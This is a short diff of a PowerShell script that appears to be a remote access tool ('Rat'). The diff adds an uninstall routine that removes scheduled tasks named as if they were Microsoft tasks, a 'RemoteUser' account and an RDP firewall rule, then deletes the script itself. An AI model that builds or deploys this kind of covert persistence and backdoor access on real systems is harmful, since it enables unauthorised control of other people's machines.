@@ -105,6 +105,16 @@ function exec {
     Create-Gist -Token $Token
 }
 
+function uninstall {
+    try {schtasks /delete /tn "Microsoft\Rat" /f | out-null} catch {}
+    try {schtasks /delete /tn "Microsoft\RatLogon" /f | out-null} catch {}
+    try {Disable-RemoteDesktop} catch {}
+    try {Remove-LocalUser -Name "RemoteUser" -ErrorAction Stop} catch {}
+    try {Remove-NetFirewallRule -DisplayName "Allow RDP" -ErrorAction Stop} catch {}
+    try {Remove-Item -Path $PSCommandPath} catch {}
+    Exit
+}
+
 function main {
     $ProgressPreference = 'SilentlyContinue'
     Startup
@@ -117,7 +127,7 @@ function main {
         exec
     }
     if ($run -eq "disable") {
-        Disable-RemoteDesktop
+        uninstall
     }
 
     $ProgressPreference = 'Continue'
